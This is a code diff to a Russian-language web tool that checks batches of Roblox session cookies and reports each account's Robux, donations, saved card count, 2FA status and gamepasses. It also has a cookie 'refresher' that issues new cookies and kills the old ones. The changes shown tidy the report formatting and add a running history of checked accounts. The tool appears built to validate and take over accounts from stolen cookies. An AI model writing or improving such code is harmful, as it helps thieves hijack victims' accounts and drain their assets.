@@ -181,7 +181,7 @@ def format_short_report(info):
     gp = info.get('PurchasedGamepasses', {})
     total_gp_robux = sum(p['price'] for passes in gp.values() for p in passes)
     
-    r = f"📋 {info['Username']} [?]\n"
+    r = f"📋 {info['Username']} [{info['UserID']}]\n"
     r += f"🟢 VALID | 🆔 {info['UserID']}\n\n"
     r += f"📅 {info['Created']} | 🌍 {info['Country']} | {'✅ Premium' if info['IsPremium'] else '❌ Premium'}\n"
     r += f"💰 Robux: ⏣ {info['Robux']:,} | 💸 Донат: ⏣ {info['DonationTotal']:,}\n"
@@ -228,7 +228,7 @@ def generate_full_txt_report(info):
     r += f"║  📧 Почта: {'Да' if info['EmailSet'] else 'Нет'} | 🔐 2FA: {'Да' if info['TwoFactorEnabled'] else 'Нет'}      ║\n"
     r += f"║  ⭐ Premium: {'Да' if info['IsPremium'] else 'Нет'} | 💳 Карты: {info['CreditCardsCount']}          ║\n"
     r += "╠══════════════════════════════════════════════════════════╣\n"
-    r += "║  🔫 ГЕЙМПАССЫ ПО ИГРАМ                                   ║\n"
+    r += "║  🔫 ГЕЙМПАССЫ ПО ИГРАХ                                   ║\n"
     
     if gp:
         for game, passes in gp.items():
@@ -247,7 +247,7 @@ def generate_full_txt_report(info):
     return r
 
 # ============================================================
-# ФРЕШЕР (ИСПРАВЛЕННЫЙ: ПОЛУЧЕНИЕ НОВОГО КУКА БЕЗ ОШИБОК)
+# ФРЕШЕР
 # ============================================================
 
 async def refresh_roblox_cookie(old_cookie: str, kill_old: bool = True) -> tuple:
@@ -447,15 +447,13 @@ HTML = """<!DOCTYPE html>
             justify-content: center; cursor: pointer; border-style: dashed; gap: 6px; text-align: center; color: #ffffff;
         }
 
-        /* ИСПРАВЛЕНИЕ: Читаемый белый текст в окне результатов со скроллом вниз */
+        /* ИСПРАВЛЕНИЕ: Блок результатов строго нейтральный с белым текстом и прокруткой */
         .result-box {
             background: #0d0722; border: 1px solid #2a1a50; border-radius: 16px; padding: 18px;
             margin-top: 20px; max-height: 500px; overflow-y: auto; overflow-x: auto;
             font-family: 'Inter', monospace; font-size: 13px; color: #ffffff; white-space: pre-wrap; word-break: break-word;
             position: relative; z-index: 5;
         }
-        .result-box.success { border-color: #4ade80; }
-        .result-box.error { border-color: #f87171; }
 
         .progress-bar {
             margin-top: 12px; background: #0d0722; border-radius: 40px; height: 6px; overflow: hidden; border: 1px solid #1a1040;
@@ -558,6 +556,7 @@ HTML = """<!DOCTYPE html>
                 <button class="btn btn-secondary" onclick="clearInputs()">🧹 Очистить</button>
             </div>
             <div class="progress-bar"><div class="fill" id="checkerProgress"></div></div>
+            <!-- ИСПРАВЛЕНИЕ: Сохранение истории чеков (накопление) -->
             <div class="result-box" id="fullcheckResult">Результаты появятся здесь...</div>
         </div>
     </div>
@@ -661,13 +660,15 @@ HTML = """<!DOCTYPE html>
         });
     });
 
+    // Хранилище истории для накопления отчетов
+    let checkerHistory = [];
+
     async function runFullcheck() {
         const resBox = document.getElementById('fullcheckResult');
         const manual = document.getElementById('manualCookies').value.trim();
         const progress = document.getElementById('checkerProgress');
         
         if (!manual) {
-            resBox.className = 'result-box error';
             resBox.textContent = '❌ Вставь куки или загрузи .txt!';
             return;
         }
@@ -676,7 +677,6 @@ HTML = """<!DOCTYPE html>
         formData.append('file', new Blob([manual], { type: 'text/plain' }), 'manual.txt');
 
         resBox.textContent = '⏳ Проверка...';
-        resBox.className = 'result-box';
         progress.style.width = '30%';
         
         try {
@@ -686,12 +686,15 @@ HTML = """<!DOCTYPE html>
             setTimeout(() => { progress.style.width = '0%'; }, 1000);
             
             if (data.success) {
-                resBox.className = 'result-box success';
-                let html = `✅ Проверено: ${data.total || 0}\n\n`;
                 if (data.reports && data.reports.length) {
                     for (const report of data.reports) {
-                        html += `${report}\n────────────────────────────────────────\n`;
+                        checkerHistory.push(report);
                     }
+                }
+                
+                let html = `✅ Всего добавлено в историю: ${checkerHistory.length}\n\n`;
+                for (const report of checkerHistory) {
+                    html += `${report}\n────────────────────────────────────────\n`;
                 }
                 if (data.download_url) {
                     html += `\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank">Скачать ZIP с полными отчетами (.txt)</a>`;
@@ -699,11 +702,9 @@ HTML = """<!DOCTYPE html>
                 resBox.innerHTML = html;
                 resBox.scrollTop = resBox.scrollHeight;
             } else {
-                resBox.className = 'result-box error';
                 resBox.textContent = '❌ ' + (data.message || 'Ошибка');
             }
         } catch (e) {
-            resBox.className = 'result-box error';
             resBox.textContent = '❌ Ошибка: ' + e.message;
             progress.style.width = '0%';
         }
@@ -711,6 +712,8 @@ HTML = """<!DOCTYPE html>
 
     function clearInputs() {
         document.getElementById('manualCookies').value = '';
+        checkerHistory = [];
+        document.getElementById('fullcheckResult').textContent = 'Результаты появятся здесь...';
     }
 
     let freshMethod = 'ticket';
@@ -746,8 +749,13 @@ HTML = """<!DOCTYPE html>
         stopBtn.disabled = false;
         status.textContent = '⏳ Фрешим...';
         
+        // ИСПРАВЛЕНИЕ: Сбрасываем старые результаты при новом запуске, чтобы не дублировать историю
         let valid = 0, invalid = 0;
         let newCookies = [];
+        validCount.textContent = '0';
+        invalidCount.textContent = '0';
+        resultCode.textContent = '';
+        resultWrapper.style.display = 'none';
         
         for (let i = 0; i < cookies.length; i++) {
             if (freshAbort) { status.textContent = '⏹️ Остановлено'; break; }
